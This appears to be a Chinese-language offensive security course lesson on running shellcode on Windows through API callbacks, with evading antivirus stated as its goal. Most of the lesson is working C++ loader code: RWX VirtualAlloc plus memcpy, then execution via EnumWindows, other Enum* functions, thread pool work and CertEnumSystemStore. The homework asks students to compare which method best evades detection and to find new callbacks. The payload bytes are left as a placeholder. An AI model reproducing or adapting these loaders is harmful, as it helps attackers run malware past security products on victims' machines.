# 课时25：补充Shellcode加载方式

## 1. 课程目标

学习多种ShellCode加载执行方式，增加免杀选择。

---

## 2. 加载方式汇总

| 方式 | 说明 | 隐蔽性 |
|------|------|--------|
| 函数指针 | 直接调用 | 低 |
| CreateThread | 创建线程 | 中 |
| 纤程(Fiber) | 使用纤程 | 高 |
| APC注入 | 异步过程调用 | 高 |
| 回调函数 | 利用系统回调 | 高 |
| 异常处理 | SEH/VEH | 高 |

---

## 3. 回调函数加载

### 3.1 EnumWindows回调

```cpp
#include <windows.h>

unsigned char shellcode[] = { /* ShellCode */ };

int main() {
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    // 使用EnumWindows的回调执行
    EnumWindows((WNDENUMPROC)pMem, 0);
    
    return 0;
}
```

### 3.2 其他回调

```cpp
// EnumChildWindows
EnumChildWindows(NULL, (WNDENUMPROC)pMem, 0);

// EnumDesktopWindows
EnumDesktopWindows(NULL, (WNDENUMPROC)pMem, 0);

// EnumSystemLocales
EnumSystemLocalesA((LOCALE_ENUMPROCA)pMem, LCID_INSTALLED);

// EnumFonts
HDC hdc = GetDC(NULL);
EnumFontsA(hdc, NULL, (FONTENUMPROCA)pMem, 0);

// EnumDateFormats
EnumDateFormatsA((DATEFMT_ENUMPROCA)pMem, LOCALE_USER_DEFAULT, DATE_SHORTDATE);

// CreateTimerQueueTimer
HANDLE hTimer;
CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)pMem, NULL, 0, 0, 0);
```

---

## 4. 线程池回调

```cpp
#include <windows.h>

unsigned char shellcode[] = { /* ShellCode */ };

int main() {
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    // 使用线程池回调
    PTP_WORK work = CreateThreadpoolWork((PTP_WORK_CALLBACK)pMem, NULL, NULL);
    SubmitThreadpoolWork(work);
    WaitForThreadpoolWorkCallbacks(work, FALSE);
    
    return 0;
}
```

---

## 5. CertEnumSystemStore回调

```cpp
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

unsigned char shellcode[] = { /* ShellCode */ };

int main() {
    LPVOID pMem = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    memcpy(pMem, shellcode, sizeof(shellcode));
    
    // 使用证书枚举回调
    CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL,
                        (PFN_CERT_ENUM_SYSTEM_STORE)pMem);
    
    return 0;
}
```

---

## 6. 课后作业

### 作业1：回调测试（必做）

1. 测试3种不同的回调加载方式
2. 比较免杀效果

### 作业2：发现新回调（进阶）

1. 研究Windows API找出更多可用回调
2. 实现并测试

---

## 7. 下一课预告

下一课我们将学习非对称加密加密ShellCode。
